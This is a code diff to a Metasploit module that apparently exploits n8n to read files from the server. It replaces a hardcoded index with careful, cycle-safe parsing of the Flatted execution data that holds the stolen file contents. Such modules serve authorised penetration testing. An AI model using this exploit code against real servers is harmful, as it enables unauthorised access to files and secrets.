@@ -8,6 +8,8 @@ class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
+  FORM_NODE_NAME = 'On form submission'.freeze
+
   def initialize(info = {})
     super(
       update_info(
@@ -131,7 +133,7 @@ class MetasploitModule < Msf::Auxiliary
           typeVersion: 2.3,
           position: [0, 0],
           id: 'e4f12efa-9975-4041-b71f-0ce4999ec5a7',
-          name: 'On form submission',
+          name: FORM_NODE_NAME,
           webhookId: random_uuid
         }
       ],
@@ -183,11 +185,11 @@ class MetasploitModule < Msf::Auxiliary
       },
       startNodes: [
         {
-          name: 'On form submission',
+          name: FORM_NODE_NAME,
           sourceData: 'null'
         }
       ],
-      destinationNode: 'On form submission'
+      destinationNode: FORM_NODE_NAME
     }
 
     res = send_request_cgi(
@@ -289,19 +291,74 @@ class MetasploitModule < Msf::Auxiliary
 
     json_data = res.get_json_document
 
-    file_data = json_data.dig('data', 'data')
+    file_data = json_data.is_a?(Hash) && json_data['data'].is_a?(Hash) ? json_data['data']['data'] : nil
+    fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data.is_a?(String)
 
-    fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data
+    file_content_enc = execution_file_data(parse_json_data(file_data))
+    begin
+      ::Base64.strict_decode64(file_content_enc)
+    rescue ArgumentError => e
+      elog('Failed to decode file data from the n8n execution result', error: e)
+      fail_with(Failure::UnexpectedReply, 'Invalid Base64 file data in the n8n execution result.')
+    end
+  end
 
-    parsed_file_data = parse_json_data(file_data)
+  def execution_file_data(table)
+    unless table.is_a?(Array) && table.first.is_a?(Hash)
+      fail_with(Failure::UnexpectedReply, 'Malformed n8n execution file data.')
+    end
 
-    file_content_enc = parsed_file_data[29]
+    # n8n uses Flatted references, whose indexes vary with optional metadata.
+    # Follow only our single form result; do not expand arbitrary/cyclic graphs.
+    visited = [0]
+    node = table.first
+    ['resultData', 'runData', FORM_NODE_NAME, 0, 'data', 'main', 0, 0, 'binary'].each do |key|
+      node = execution_member(table, node, key, visited)
+    end
+    unless node.is_a?(Hash)
+      fail_with(Failure::UnexpectedReply, 'Malformed n8n execution file data.')
+    end
+    fail_with(Failure::NotFound, 'The execution did not contain the uploaded file.') if node.empty?
+    unless node.length == 1
+      fail_with(Failure::UnexpectedReply, 'Ambiguous n8n execution file data.')
+    end
 
-    fail_with(Failure::NotFound, 'File not found') unless file_content_enc
+    # The workflow creates exactly one file field with a randomized label.
+    descriptor = execution_reference(table, node.values.first, visited)
+    data = execution_member(table, descriptor, 'data', visited)
+    fail_with(Failure::UnexpectedReply, 'Malformed n8n execution file data.') unless data.is_a?(String)
 
-    file_content = ::Base64.decode64(file_content_enc)
+    data
+  end
 
-    file_content
+  def execution_member(table, node, key, visited)
+    if node.is_a?(Hash) && key.is_a?(String)
+      fail_with(Failure::NotFound, 'The execution did not contain the uploaded file.') unless node.key?(key)
+    elsif node.is_a?(Array) && key == 0
+      fail_with(Failure::NotFound, 'The execution did not contain the uploaded file.') if node.empty?
+      unless node.length == 1
+        fail_with(Failure::UnexpectedReply, 'Ambiguous n8n execution file data.')
+      end
+    else
+      fail_with(Failure::UnexpectedReply, 'Malformed n8n execution file data.')
+    end
+
+    execution_reference(table, node[key], visited)
+  end
+
+  def execution_reference(table, reference, visited)
+    # Dereference once: a numeric-looking string stored in a table entry is a
+    # literal, not another reference. Limit index size before integer conversion.
+    unless reference.is_a?(String) && reference.length <= (table.length - 1).to_s.length && reference.match?(/\A(?:0|[1-9][0-9]*)\z/)
+      fail_with(Failure::UnexpectedReply, 'Invalid or cyclic n8n execution file reference.')
+    end
+    index = reference.to_i
+    if index >= table.length || visited.include?(index)
+      fail_with(Failure::UnexpectedReply, 'Invalid or cyclic n8n execution file reference.')
+    end
+
+    visited << index
+    table[index]
   end
 
   def parse_json_data(data)
